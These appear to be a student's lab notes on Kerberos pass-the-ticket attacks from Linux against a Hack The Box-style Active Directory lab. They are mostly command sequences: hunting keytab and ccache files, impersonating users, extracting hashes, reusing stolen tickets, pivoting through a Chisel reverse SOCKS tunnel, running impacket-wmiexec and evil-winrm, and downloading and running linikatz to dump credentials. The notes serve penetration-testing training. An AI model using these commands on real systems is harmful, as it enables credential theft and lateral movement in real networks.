
Kerberos
- kinit
- klist

Keytab is a file containing pairs of Kerberos principals and encrypted keys. It is not restricted to the system it was created on.

Default path: /etc/krb5.keytab
- Only read by root
- If gain access, we can impersonate user

Linux Auth via Port Forward
```shell-session
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

Check domain joined with (realm / sssd / winbind)
```shell-session
realm list
```
```shell-session
ps -ef | grep -i "winbind\|sssd"
```

Finding keytab files
```shell-session
find / -name *keytab* -ls 2>/dev/null
```

Identifying keytab files in cronjobs
```shell-session
crontab -l
```

#### Ccache
- Credential cache file storing kerberos ticket information
- The path is placed in KRB5CCNAME environment variable
- Default located at /tmp

```shell-session
env | grep -i krb5
```
```shell-session
ls -la /tmp
```


Listing keytab file information
```shell-session
klist -k -t /opt/specialfiles/carlos.keytab 
```

Impersonating a user with a keytab
```shell-session
klist
```
```shell-session
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
```shell-session
klist
```
```shell-session
smbclient //dc01/carlos -k -c ls
```

**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.


#### Keytab Extract
- To gain access to linux account, we must have password

Extracting Keytab Hashes with KeyTabExtract
```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```
We can now pass the hash, crack the hash, or use Rubeus

Gain root:
```shell-session
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
```
```shell-session
sudo -l
```
```shell-session
sudo su
```

Identify Group Membership
```shell-session
id julio@inlanefreight.htb
```

Importing the ccache file into our current session
```shell-session
klist
```
```shell-session
cp /tmp/krb5cc_647401106_I8I133 .
```
```shell-session
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```
```shell-session
klist
```
```shell-session
smbclient //dc01/C$ -k -c ls -no-pass
```

Allow access on domain controller from attack host
```shell-session
MasterMarkyMark@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```
Proxychains configuration file
```shell-session
cat /etc/proxychains.conf

[ProxyList]
socks5 127.0.0.1 1080
```

Download Chisel to our attack host
```shell-session
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```
```shell-session
gzip -d chisel_1.7.7_linux_amd64.gz
```
```shell-session
mv chisel_* chisel && chmod +x ./chisel
```
```shell-session
sudo ./chisel server --reverse 
```

Connect to MS01 with xfreerdp
```shell-session
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

Execute chisel from MS01
```cmd-session
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

Setting the KRB5CCNAME Env Variable on attack host
```shell-session
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

Using Impacket with proxychains and Kerberos Authentication
```shell-session
proxychains impacket-wmiexec dc01 -k
```

#### evil-winrm
```shell-session
sudo apt-get install krb5-user -y
```

If krb5-user is already installed, change the configuration file /etc/krb5.conf to 

```shell-session
MasterMarkyMark@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

```shell-session
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

#### Misc

Convert ccache (Linux) to kirbi (Windows) and vice versa
```shell-session
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

Import ticket with Rubeus
```cmd-session
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

Linikatz - mimikatz for UNIX
```shell-session
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```
```shell-session
/opt/linikatz.sh
```

